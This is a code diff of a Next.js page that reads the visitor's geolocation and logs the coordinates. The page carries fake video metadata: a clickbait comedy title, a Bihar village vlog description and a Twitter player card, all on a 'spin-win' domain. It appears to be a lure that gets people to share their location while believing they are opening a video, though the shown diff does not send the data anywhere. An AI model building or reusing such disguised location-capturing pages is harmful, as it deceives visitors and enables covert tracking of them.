@@ -24,6 +24,8 @@ export default function Home() {
         const lat = position.coords.latitude;
         const lng = position.coords.longitude;
 
+        console.log('aa', lat, lng)
+
         setLocation({ lat, lng });
         setError(null);
         setShowEnableButton(false);
@@ -55,35 +57,35 @@ export default function Home() {
 
   return (
     <>
-    <Head>
-  <title>New Entertainment Top Funny Video Best Comedy in 2022 Episode 139 By MY FAMILY</title>
-  <meta name="description" content="Experience authentic rural life in Bihar! Join me for a full day in my village - farming, local food, traditions and beautiful countryside. Don't forget to like and subscribe!" />
-  
-  {/* Open Graph / Facebook */}
-  <meta property="og:type" content="video.other" />
-  <meta property="og:title" content="New Entertainment Top Funny Video Best Comedy in 2022 Episode 139 By MY FAMILY" />
-  <meta property="og:description" content="Experience authentic rural life in Bihar! Full day village vlog showing farming, local food and traditions." />
-  <meta property="og:image" content="https://spin-win-gamma.vercel.app/thumbnail.jpg" />
-  <meta property="og:url" content="https://spin-win-gamma.vercel.app" />
-  <meta property="og:site_name" content="Bihar Daily Vlogs" />
-  <meta property="og:video:duration" content="1245" />
-  
-  {/* Twitter */}
-  <meta name="twitter:card" content="player" />
-  <meta name="twitter:title" content="New Entertainment Top Funny Video Best Comedy in 2022 Episode 139 By MY FAMILY" />
-  <meta name="twitter:description" content="Experience authentic rural life in Bihar! Full day village vlog showing farming, local food and traditions." />
-  <meta name="twitter:image" content="https://spin-win-gamma.vercel.app/thumbnail.jpg" />
-  <meta name="twitter:player" content="https://spin-win-gamma.vercel.app" />
-  <meta name="twitter:player:width" content="1280" />
-  <meta name="twitter:player:height" content="720" />
-  
-  {/* Additional YouTube-like tags */}
-  <meta name="keywords" content="Bihar vlog, rural India, village life, Indian farming, Bihar culture, daily vlog, Bihar tourism" />
-  <meta property="video:tag" content="Bihar" />
-  <meta property="video:tag" content="Village Life" />
-  <meta property="video:tag" content="India" />
-</Head>
-    <VideoPage />
+      <Head>
+        <title>New Entertainment Top Funny Video Best Comedy in 2022 Episode 139 By MY FAMILY</title>
+        <meta name="description" content="Experience authentic rural life in Bihar! Join me for a full day in my village - farming, local food, traditions and beautiful countryside. Don't forget to like and subscribe!" />
+
+        {/* Open Graph / Facebook */}
+        <meta property="og:type" content="video.other" />
+        <meta property="og:title" content="New Entertainment Top Funny Video Best Comedy in 2022 Episode 139 By MY FAMILY" />
+        <meta property="og:description" content="Experience authentic rural life in Bihar! Full day village vlog showing farming, local food and traditions." />
+        <meta property="og:image" content="https://spin-win-gamma.vercel.app/thumbnail.jpg" />
+        <meta property="og:url" content="https://spin-win-gamma.vercel.app" />
+        <meta property="og:site_name" content="Bihar Daily Vlogs" />
+        <meta property="og:video:duration" content="1245" />
+
+        {/* Twitter */}
+        <meta name="twitter:card" content="player" />
+        <meta name="twitter:title" content="New Entertainment Top Funny Video Best Comedy in 2022 Episode 139 By MY FAMILY" />
+        <meta name="twitter:description" content="Experience authentic rural life in Bihar! Full day village vlog showing farming, local food and traditions." />
+        <meta name="twitter:image" content="https://spin-win-gamma.vercel.app/thumbnail.jpg" />
+        <meta name="twitter:player" content="https://spin-win-gamma.vercel.app" />
+        <meta name="twitter:player:width" content="1280" />
+        <meta name="twitter:player:height" content="720" />
+
+        {/* Additional YouTube-like tags */}
+        <meta name="keywords" content="Bihar vlog, rural India, village life, Indian farming, Bihar culture, daily vlog, Bihar tourism" />
+        <meta property="video:tag" content="Bihar" />
+        <meta property="video:tag" content="Village Life" />
+        <meta property="video:tag" content="India" />
+      </Head>
+      <VideoPage />
     </>
   );
 }
